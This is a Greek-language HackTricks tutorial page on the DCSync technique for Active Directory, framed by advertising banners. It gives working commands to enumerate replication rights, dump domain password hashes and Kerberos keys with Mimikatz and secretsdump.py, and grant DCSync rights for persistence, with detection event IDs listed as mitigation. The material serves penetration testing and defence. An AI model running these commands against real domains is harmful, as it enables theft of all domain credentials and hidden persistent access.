# DCSync

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για εύκολη δημιουργία και **αυτοματοποίηση ροών εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## DCSync

Η άδεια **DCSync** σημαίνει ότι έχετε αυτές τις άδειες πάνω στον ίδιο το domain: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** και **Replicating Directory Changes In Filtered Set**.

**Σημαντικές σημειώσεις σχετικά με το DCSync:**

* Η επίθεση **DCSync προσομοιώνει τη συμπεριφορά ενός Domain Controller και ζητά από άλλους Domain Controllers να αντιγράψουν πληροφορίες** χρησιμοποιώντας το Directory Replication Service Remote Protocol (MS-DRSR). Καθώς το MS-DRSR είναι μια έγκυρη και απαραίτητη λειτουργία του Active Directory, δεν μπορεί να απενεργοποιηθεί ή απενεργοποιηθεί.
* Από προεπιλογή μόνο οι ομάδες **Domain Admins, Enterprise Admins, Administrators και Domain Controllers** έχουν τα απαιτούμενα προνόμια.
* Εάν κάποιος κωδικοί πρόσβασης λογαριασμών αποθηκεύονται με αντιστρεπτή κρυπτογράφηση, υπάρχει δυνατότητα στο Mimikatz να επιστραφεί ο κωδικός πρόσβασης σε καθαρό κείμενο

### Απαρίθμηση

Ελέγξτε ποιος έχει αυτές τις άδειες χρησιμοποιώντας το `powerview`:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Εκμετάλλευση Τοπικά
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Εκμετάλλευση απομακρυσμένα
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` δημιουργεί 3 αρχεία:

* ένα με τις **NTLM κατακερματισμένες τιμές**
* ένα με τα **κλειδιά Kerberos**
* ένα με κείμενο καθαρού κειμένου από το NTDS για οποιουσδήποτε λογαριασμούς οι οποίοι έχουν ενεργοποιημένη την [**αντιστρεπτή κρυπτογράφηση**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Μπορείτε να πάρετε χρήστες με αντιστρεπτή κρυπτογράφηση με την εντολή

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Μόνιμη παρουσία

Αν είστε διαχειριστής τομέα, μπορείτε να χορηγήσετε αυτές τις άδειες σε οποιονδήποτε χρήστη με τη βοήθεια του `powerview`:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Στη συνέχεια, μπορείτε **να ελέγξετε εάν ο χρήστης ανατέθηκε σωστά** τα 3 προνόμια αναζητώντας τα στην έξοδο του (θα πρέπει να μπορείτε να δείτε τα ονόματα των προνομίων μέσα στο πεδίο "ObjectType"):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Αντιμετώπιση

* Ασφάλεια Συμβάντος ID 4662 (Η πολιτική ελέγχου για το αντικείμενο πρέπει να είναι ενεργοποιημένη) – Έγινε μια λειτουργία σε ένα αντικείμενο
* Ασφάλεια Συμβάντος ID 5136 (Η πολιτική ελέγχου για το αντικείμενο πρέπει να είναι ενεργοποιημένη) – Ένα αντικείμενο υπηρεσίας καταλόγου τροποποιήθηκε
* Ασφάλεια Συμβάντος ID 4670 (Η πολιτική ελέγχου για το αντικείμενο πρέπει να είναι ενεργοποιημένη) – Οι άδειες σε ένα αντικείμενο άλλαξαν
* AD ACL Scanner - Δημιουργήστε και συγκρίνετε αναφορές δημιουργίας ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Αναφορές

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την εταιρεία σας να διαφημίζεται στο HackTricks ή να κατεβάσετε το HackTricks σε PDF, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο **προηγμένα εργαλεία** της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
